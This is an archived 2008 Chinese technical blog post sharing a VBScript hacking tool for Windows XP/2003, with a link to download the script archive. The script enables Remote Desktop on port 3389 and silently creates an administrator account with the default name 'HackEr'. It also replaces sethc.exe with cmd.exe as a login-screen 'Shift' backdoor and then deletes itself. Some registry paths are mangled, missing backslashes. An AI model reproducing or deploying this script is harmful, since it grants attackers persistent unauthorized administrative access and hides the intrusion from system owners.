---
title: XP、2003开3389+非net创建管理用户+Shift后门+自删除脚本vbs
description: 孤狐浪子来源红狼
date: 2008-02-26 09:31:45
category: 技术文章
tags: ['Windows', 'VBS', '脚本Script']
post_id: 383
alias: XP-2003-open3389-SHIFTbackdoor-vbs
ViewNums: 5289
---

作者：孤狐浪子
来源：红狼

on error resume next
const HKEY_LOCAL_MACHINE = &H80000002
strComputer = "."
Set StdOut = WScript.StdOut
Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\" &_
strComputer & "
ootdefault:StdRegProv")
strKeyPath = "SYSTEMCurrentControlSetControlTerminal Server"
oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPath
strKeyPath = "SYSTEMCurrentControlSetControlTerminal ServerWds
dpwdTds cp"
oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPath
strKeyPath = "SYSTEMCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp"
strKeyPath = "SYSTEMCurrentControlSetControlTerminal Server"
strValueName = "fDenyTSConnections"
dwValue = 0
oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,dwValue
strKeyPath = "SYSTEMCurrentControlSetControlTerminal ServerWds
dpwdTds cp"
strValueName = "PortNumber"
dwValue = 3389
oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,dwValue
strKeyPath = "SYSTEMCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp"
strValueName = "PortNumber"
dwValue = 3389
oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,dwValue
on error resume next
dim username,password:If Wscript.Arguments.Count Then:username=Wscript.Arguments(0):password=Wscript.Arguments(1):Else:username="HackEr":password="393214425":end if:set wsnetwork=CreateObject("WSCRIPT.NETWORK"):os="WinNT://"&wsnetwork.ComputerName:Set ob=GetObject(os):Set oe=GetObject(os&"/Administrators,group"):Set od=ob.Create("user",username):od.SetPassword password:od.SetInfo:Set of=GetObject(os&"/"&username&",user"):oe.Add(of.ADsPath)'wscript.echo of.ADsPath
On Error Resume Next
Dim obj, success
Set obj = CreateObject("WScript.Shell")
success = obj.run("cmd /c takeown /f %SystemRoot%system32sethc.exe&echo y| cacls %SystemRoot%system32sethc.exe /G %USERNAME%:F&copy; %SystemRoot%system32cmd.exe %SystemRoot%system32acmd.exe&copy; %SystemRoot%system32sethc.exe %SystemRoot%system32asethc.exe&del %SystemRoot%system32sethc.exe&ren %SystemRoot%system32acmd.exe sethc.exe", 0, True)
CreateObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptName)

BY:孤狐浪子 QQ:393214425
BLOG:itpro.blog.163.com

附件下载地址：
[开3389+非net创建管理用户+Shift后门+自删除脚本.rar](/blog/download.asp?id=52 "http://201314.free.fr/attachments/200801/%bf%aa3389_%b7%c7net%b4%b4%bd%a8%b9%dc%c0%ed%d3%c3%bb%a7_shift%ba%f3%c3%c5_%d7%d4%c9%be%b3%fd%bd%c5%b1%be.rar" (1 KB)

